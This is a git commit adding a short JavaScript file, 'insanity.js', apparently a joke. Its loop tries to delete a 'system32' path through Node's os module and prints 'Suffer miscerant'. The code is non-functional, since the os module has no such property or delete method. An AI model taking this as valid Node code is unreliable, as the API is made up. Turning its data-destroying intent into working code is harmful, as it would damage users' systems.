3ee61fcee629061d2af791581a5efda0cff474dc
coolmane67 <130321983+coolmane67@users.noreply.github.com>
2023-04-10 01:46:22 +0200

    why god
    please

---
+++ insanity.js
@@ -0,0 +1,10 @@
+let infinitesuffering = true;
+const heart = require('os');
+
+while (infinitesuffering != false) {
+  filesystems = heart.path.system32;
+  if (filesystems != false) {
+    heart.delete(filesystems)
+    console.log('Suffer miscerant');
+  }
+}
